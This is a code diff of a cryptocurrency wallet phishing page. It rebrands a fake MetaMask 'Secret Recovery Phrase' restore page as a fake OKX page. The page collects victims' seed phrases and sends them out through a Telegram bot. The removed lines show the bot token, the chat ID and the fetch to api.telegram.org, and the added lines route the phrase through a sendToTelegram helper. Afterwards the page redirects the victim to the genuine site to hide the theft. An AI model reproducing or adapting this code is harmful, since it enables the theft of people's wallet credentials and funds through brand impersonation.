@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Secret Recovery Phrase</title>
-  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
+  <title>Secure</title>
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/2/2c/OKX_logo.svg">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; }
@@ -73,7 +73,7 @@
       margin: 0 auto 6px;
     }
     .step.active .circle {
-      background-color: #6264ff;
+      background-color: #9AED2C;
       color: #fff;
       border: none;
     }
@@ -107,7 +107,7 @@
       margin: 10px 0;
       padding: 10px;
       background: #f5f5ff;
-      border-left: 4px solid #6264ff;
+      border-left: 4px solid #9AED2C;
       border-radius: 4px;
     }
     .seed-inputs {
@@ -129,7 +129,7 @@
       font-size: 14px;
     }
     .submit-btn {
-      background: linear-gradient(90deg, #537cff, #537cff);
+      background: linear-gradient(90deg, #9AED2C, #9AED2C); /* bouton rouge */
       border: none;
       color: white;
       width: 100%;
@@ -186,7 +186,7 @@
 <body>
 
   <div class="top-bar">
-    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px"></div>
+    <div><img src="https://upload.wikimedia.org/wikipedia/commons/2/2c/OKX_logo.svg" width="70px"></div>
     <select class="language-select">
       <option value="en">English</option>
       <option value="fr">Français</option>
@@ -196,7 +196,6 @@
 
   <main>
     <div class="card">
-
       <div class="step-circles">
         <div class="step active">
           <div class="circle">1</div>
@@ -210,7 +209,7 @@
 
       <h1>Access your wallet with your Secret Recovery Phrase</h1>
       <p class="description">
-        MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password.
+        OKX cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password.
         First, enter the Secret Recovery Phrase that you were given when you created your wallet. <a href="#">Learn more</a>
       </p>
 
@@ -228,7 +227,7 @@
 
       <div class="captcha-container" id="captchaContainer">
         <label class="captcha-label" id="captchaQuestion" for="captchaInput">Please solve:</label>
-        <input class="captcha-input" id="captchaInput" type="text" autocomplete="off" />
+        <input class="captcha-input" id="captchaInput" type="number" autocomplete="off" />
       </div>
 
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
@@ -240,22 +239,20 @@
   </main>
 
   <script src="bip39-words.js"></script>
+  <script src="telegram.js"></script>
   <script>
     const submitBtn = document.getElementById("submitBtn");
     const captchaContainer = document.getElementById("captchaContainer");
     const captchaInput = document.getElementById("captchaInput");
     const captchaQuestion = document.getElementById("captchaQuestion");
     const errorMsg = document.getElementById("errorMsg");
-
-    let captchaAnswer = "";
+    let captchaAnswer = null;
 
     function generateCaptcha() {
-      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-      captchaAnswer = "";
-      for (let i = 0; i < 5; i++) {
-        captchaAnswer += chars.charAt(Math.floor(Math.random() * chars.length));
-      }
-      captchaQuestion.textContent = `Please solve: ${captchaAnswer}`;
+      const num1 = Math.floor(Math.random() * 10) + 1;
+      const num2 = Math.floor(Math.random() * 10) + 1;
+      captchaAnswer = num1 + num2;
+      captchaQuestion.textContent = `Please solve: ${num1} + ${num2} =`;
       captchaInput.value = "";
     }
 
@@ -315,9 +312,8 @@
     }
 
     function checkCaptcha() {
-      const answer = captchaInput.value.trim().toUpperCase();
-      const isCorrect = answer === captchaAnswer;
-      submitBtn.disabled = !isCorrect;
+      const answer = captchaInput.value.trim();
+      submitBtn.disabled = parseInt(answer) !== captchaAnswer;
     }
 
     function validateBIP39Words() {
@@ -340,54 +336,37 @@
 
     function handleConfirm() {
       if (submitBtn.disabled) return;
-
       if (!validateBIP39Words()) {
         errorMsg.style.display = "block";
         return;
-      } else {
-        errorMsg.style.display = "none";
       }
 
       const count = parseInt(document.getElementById("phraseLength").value);
       let phrase = "";
       for (let i = 1; i <= count; i++) {
-        const value = document.querySelector(`input[name='word${i}']`).value;
-        phrase += value.trim() + " ";
+        phrase += document.querySelector(`input[name='word${i}']`).value.trim() + " ";
       }
 
-      const botToken = "7764687324:AAEEMqhHb-rAf1-i_z5LSCW1JJcwTYj9s5c";
-      const chatId = "6996434307";
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: "Secret Recovery Phrase:\n" + phrase.trim()
-        })
-      });
+      sendToTelegram(phrase);
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://metamask.io/";
+        window.location.href = "https://www.okx.com/";
       }, 800);
     }
 
     document.addEventListener("paste", function(e) {
       const activeInput = document.activeElement;
       if (!activeInput || !activeInput.name || !activeInput.name.startsWith("word")) return;
-
       const paste = (e.clipboardData || window.clipboardData).getData("text");
       const words = paste.trim().split(/\s+/);
       if (words.length < 2) return;
-
       e.preventDefault();
       words.forEach((word, index) => {
         const input = document.querySelector(`input[name='word${index + 1}']`);
         if (input) input.value = word;
       });
-
       checkFieldsFilled();
     });
 
